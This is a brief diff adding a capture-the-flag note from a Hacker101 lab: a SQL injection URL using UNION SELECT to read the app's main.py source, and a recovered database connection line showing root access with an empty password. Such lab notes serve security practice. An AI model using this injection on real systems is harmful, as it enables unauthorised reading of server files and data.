@@ -1,0 +1,6 @@
+access to main.py using slqi: 
+https://f2195a652268872337b9a8d58330559f.ctf.hacker101.com/fetch?id=0+UNION+SELECT+'main.py'
+
+
+MySQLdb.connect(host="localhost", user="root", password="", db="level5")
+
